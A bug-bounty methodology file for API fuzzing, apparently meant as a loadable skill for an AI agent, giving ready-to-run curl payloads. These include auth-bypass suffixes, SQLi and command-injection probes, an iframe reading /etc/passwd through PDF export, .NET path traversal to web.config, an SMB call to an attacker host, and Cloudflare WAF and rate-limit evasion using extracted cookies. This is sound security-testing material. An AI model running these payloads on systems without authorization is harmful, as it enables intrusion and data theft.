---
name: "api-fuzzing"
version: "2.1"
category: "api"
subcategory: "api-fuzzing"
phase: "scanning"
tags: ["bug-bounty", "api", "fuzzing", "rest", "soap", "swagger", "endpoint-discovery", "access-control", "account-takeover", "auth", "authorization", "bypass", "cloud", "cors", "exploitation", "graphql", "idor", "iis", "information-disclosure", "js-recon", "mass-assignment", "mobile", "oauth", "path-traversal", "privesc", "session", "takeover", "token", "waf-bypass"]
tools: ["kiterunner", "burp-suite", "swagger-ez", "json2paths", "apicheck", "arjun", "authz", "autorize", "burp", "graphqlmap", "grpcurl", "john", "paramalyzer", "parameth", "repeater", "restler", "zap"]
follow_up_skills: ["graphql-vulnerabilities", "json-auth-fuzzing", "jwt-attacks", "sqli", "xss", "ssti", "ssrf", "xxe", "lfi", "idor-detection-exploitation", "mass-assignment"]
description: "Bug bounty skill: api fuzzing - scanning phase, api category"
---
# API Fuzzing

## Summary

Comprehensive API fuzzing methodology covering REST, GraphQL, and SOAP — endpoint discovery, authentication bypass, IDOR, injection testing (SQLi, NoSQLi, command, XXE, SSRF), HTTP method tampering, content-type switching, endpoint bypass, and output exploitation via PDF exports.

## Key Concepts

- **API Types**: REST (JSON/XML endpoints), GraphQL (single endpoint, custom queries), SOAP (XML envelope)
- **Swagger/OpenAPI**: Standardized API documentation format — often exposes all endpoints
- **Endpoint Bypass**: Adding trailing characters (`.json`, `?`, `/`, `%20`, `%09`, `#`, `..;/`) to bypass 403/401 restrictions
- **Content-Type Switching**: JSON ↔ XML can trigger different parsing logic and expose hidden vulnerabilities
- **Output Exploitation**: PDF/image export generators may include user-supplied HTML, enabling SSRF/LFI
- **.NET Path.Combine Bug**: `Path.Combine(path_1, path_2)` returns `path_2` if it starts with a separator — leading to path traversal

## Technical Details

### API Reconnaissance

Common Swagger/OpenAPI paths:
```
/swagger.json, /openapi.json, /api-docs, /v1/api-docs, /swagger-ui.html
```

Use Kiterunner with assetnote wordlists for API route discovery, and check archive.org for historical API endpoints.

### Endpoint Bypass (403/401)

When an endpoint returns 403/401, try append bypasses:
```
/api/v1/users/sensitivedata
→ /api/v1/users/sensitivedata.json
→ /api/v1/users/sensitivedata?
→ /api/v1/users/sensitivedata/
→ /api/v1/users/sensitivedata??
→ /api/v1/users/sensitivedata%20
→ /api/v1/users/sensitivedata%09
→ /api/v1/users/sensitivedata#
→ /api/v1/users/sensitivedata&details
→ /api/v1/users/..;/sensitivedata
```

### Content-Type Switching

Switch between JSON and XML — different parsers may handle the same data differently:
```bash
Content-Type: application/json → Content-Type: application/xml
```

### .NET Path.Combine Vulnerability

If a .NET app uses `Path.Combine(path_1, path_2)`, and `path_2` starts with a separator (`\`, `/`, `C:\`), it returns `path_2` as an absolute path:
```
https://target.com/download?filename=a.png
https://target.com/download?filename=C:\inetpub\wwwroot\web.config
https://target.com/download?filename=\\smb.dns.attacker.com\a.png
```

## Methodology

1. Identify the API type (REST, GraphQL, SOAP) and gather endpoints via Swagger/OpenAPI docs, Kiterunner, JS files, and archive.org.
2. Test authentication — check all login paths (`/api/mobile/login`, `/api/v3/login`, `/api/admin/login`), test rate limiting, and test mobile vs web APIs separately.
3. Test IDOR — change user/object IDs across parameters, bodies, and headers; try bypass techniques (array wrap, JSON wrap, parameter pollution, wildcard injection).
4. Test injection — SQLi in JSON parameters, command injection (Ruby `Kernel#open`, Linux `; ls`), XXE, SSRF via API params, and .NET Path.Combine.
5. Test all HTTP methods — send GET, POST, PUT, DELETE, PATCH, OPTIONS to every endpoint; check for unintended state changes. Also test **verb-specific authorization**: APIs often enforce permissions per verb — `GET` may be locked down while `DELETE`/`PUT`/`PATCH` on the same resource isn't (MFLAC via verb tampering).
6. Switch content types — send XML where JSON is expected and vice versa to trigger different parser behavior.
7. Bypass endpoint restrictions — append bypass suffixes to blocked endpoints (`.json`, `?`, `/`, `%20`, `%09`, `#`, `..;/`).
8. Hunt hidden/forgotten endpoints — brute-force `/debug`, `/backup`, `/export`, `/internal` and forgotten export endpoints (e.g., `/api/export/allData`); grep JS bundles and mobile app binaries for route strings; test legacy API versions (`/api/v1/`, `/api/v0.1/`) — security controls are often added to the newest version only.
9. Compare responses across roles — gather tokens from every user type (anonymous, user, manager, admin), then replay each endpoint with each token (Autorize/Authz in Burp). Role differences in access control are the signal.
10. Test PDF/image export features for output exploitation — inject iframe, object, img tags for LFI/SSRF.
11. Test rate limiting — send batch requests or use IP rotation to bypass limits.
12. Test for race conditions (TOCTOU) on sensitive operations (transfers, balance changes, inventory).

## Detection Commands

### Swagger/OpenAPI discovery
```bash
for path in /swagger.json /openapi.json /api-docs /v1/api-docs /swagger-ui.html; do
  status=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com$path")
  echo "$path → $status"
done
```

### API route discovery with Kiterunner
```bash
kr scan https://target.com -w routes-large.kite
```

### Method tampering
```bash
curl -X GET "https://target.com/api/v1/users/1"
curl -X POST "https://target.com/api/v1/users/1"
curl -X PUT "https://target.com/api/v1/users/1"
curl -X DELETE "https://target.com/api/v1/users/1"
curl -X PATCH "https://target.com/api/v1/users/1"
```

### Content-Type switching
```bash
curl -s -H "Content-Type: application/xml" -X POST \
  -d '<root><id>1</id></root>' "https://target.com/api/endpoint"
```

### Endpoint bypass fuzzing
```bash
for suffix in .json '' '/' '??' '%20' '%09' '#' '&details' '../' '..;/'; do
  curl -s -o /dev/null -w "%{http_code}" "https://target.com/api/v1/users/sensitivedata$suffix"
done
```

### PDF export SSRF/LFI test
```bash
# Submit HTML to PDF generator
curl -s -X POST -d 'html=<iframe src="file:///etc/passwd" height=1000 width=800>' \
  "https://target.com/api/export/pdf"
```

### .NET Path.Combine traversal
```bash
curl -s "https://target.com/download?filename=C:\\inetpub\\wwwroot\\web.config"
curl -s "https://target.com/download?filename=\\smb.dns.attacker.com\\a.png"
```

### JSON SQLi test
```bash
curl -s -H "Content-Type: application/json" -X POST \
  -d '{"id":"56456 AND 1=1#"}' "https://target.com/api/data"
# Compare with:
curl -s -H "Content-Type: application/json" -X POST \
  -d '{"id":"56456 AND 1=2#"}' "https://target.com/api/data"
```

### Ruby command injection
```bash
curl -s "https://target.com/api/fetch?url=|ls%20/"
```

### X-Requested-With header for API response
```bash
curl -s -H "X-Requested-With: XMLHttpRequest" "https://target.com/api/endpoint"
```

## Commands

### Swagger JSON to paths
```bash
python3 json2paths.py swagger.json
```

### GraphQL introspection (URL-encoded)
```bash
curl -s "https://target.com/graphql?query={__schema{types{name,kind,description,fields{name}}}}"
```

### Generate number wordlist for IDOR enumeration
```bash
seq 1 10000 > ids.txt
```

## Tools

| Tool | Purpose |
|------|---------|
| **Kiterunner** | API route discovery (assetnote wordlists) |
| **Astra** | Automated REST API security testing |
| **Fuzzapi / API-fuzzer** | API fuzzing framework |
| **apicheck** | API security checking |
| **API Guesser** | API key format identification |
| **GUID Guesser** | GUID pattern testing |
| **Swagger-EZ** | Swagger/OpenAPI parsing and testing |
| **swagroutes** | Swagger route extraction |
| **json2paths** | Convert Swagger JSON to endpoint paths |
| **MindAPI** | API testing mindmap resource |
| **Burp Suite** | Interception, Intruder, Repeater |

## GraphQL-Specific

See `GraphQL-Vulnerabilities.md` for comprehensive GraphQL methodology. Key additional points:

- **Introspection**: `{__schema{queryType{name},mutationType{name},types{kind,name,description,fields(includeDeprecated:true){name,args{name,type{name,kind}}}}}}`
- **Rate limit bypass via batching**: Send multiple mutations in one request
- **Tools**: graphw00f (fingerprinting), clairvoyance (schema reconstruction), InQL (Burp), GraphQLmap, batchql, graphql-cop

## Bypass Techniques

- **Endpoint Bypass**: `.json`, `?`, `/`, `??`, `%20`, `%09`, `#`, `&details`, `..;/`, `../` appended to blocked paths
- **Method Tampering**: Switch GET↔POST↔PUT↔DELETE↔PATCH — different methods may have different access controls
- **Content-Type Switching**: JSON↔XML — different parsers, different vulnerabilities
- **Array Wrap**: `{"id":111}` → `{"id":[111]}`
- **JSON Wrap**: `{"id":111}` → `{"id":{"id":111}}`
- **Parameter Pollution**: `?id=legit&id=victim`, `{"id":legit,"id":victim}`
- **Wildcard Injection**: `{"user_id":"*"}`
- **X-Requested-With Header**: Add `X-Requested-With: XMLHttpRequest` to simulate frontend — some APIs respond differently
- **Archive.org**: Check historical API endpoints that may have been removed but still accessible

## Not a Finding If

- All method tampering attempts return consistent 405/403 — proper HTTP method enforcement
- Content-type switching returns 415/400 consistently — strict content-type validation
- Endpoint bypass attempts all return 403/404 — path-level access control is working
- PDF export properly sanitizes HTML input and doesn't render user-controlled HTML/XML
- Rate limiting is enforced on all endpoints with no bypass via batching or IP rotation
- Mobile and web API versions enforce the same security controls

## Notes

- Always test mobile, web, and developer API paths separately — they often have different security postures
- Always test all API versions (`/v1`, `/v2`, `/v3`) — newer versions may fix issues but older ones often remain accessible
- The `X-Requested-With: XMLHttpRequest` header can return different response formats and expose hidden data
- PDF/export functionality is a common blind SSRF and LFI vector — always test with iframe/object/img tags
- Check archive.org for historical API endpoints that may still be active but undocumented
- .NET `Path.Combine` silently returns the second argument if it's an absolute path — common source of path traversal
- Use Chrome MCP for browser-based API testing with proper timeout configuration
- Cloudflare WAF may block automated requests — add delays and use browser cookies
- Session cookies from browser automation can be used in Burp for API testing
- Multi-tenant applications often have IDOR on customer_id parameters — test all endpoints

## References

- https://github.com/assetnote/kiterunner
- https://github.com/flipkart-incubator/Astra
- https://github.com/danielmiessler/SecLists
- https://dsopas.github.io/MindAPI/play

## Chrome MCP Integration

### Browser-Based API Discovery

Use Chrome MCP to discover API endpoints through browser automation:

```javascript
// Navigate to target
await navigate_page({ url: "https://target.com", timeout: 60000 });

// Capture network requests
await list_network_requests({ 
  resourceTypes: ["fetch", "xhr"],
  pageSize: 50
});

// Get specific request details
await get_network_request({ reqid: 123 });
```

### Session Cookie Extraction

Extract cookies from browser for API testing:

```javascript
// Get cookies via JavaScript
await evaluate_script({ 
  function: "() => document.cookie" 
});
```

### Cloudflare Bypass

When Cloudflare blocks automated requests:

1. Use browser to get `cf_clearance` cookie
2. Add delays between requests (1-2 seconds)
3. Use realistic User-Agent strings
4. Extract cookies and use in Burp/curl

```bash
# Use browser-extracted cookie
curl -b "cf_clearance=..." -b "session=..." "https://target.com/api/endpoint"
```
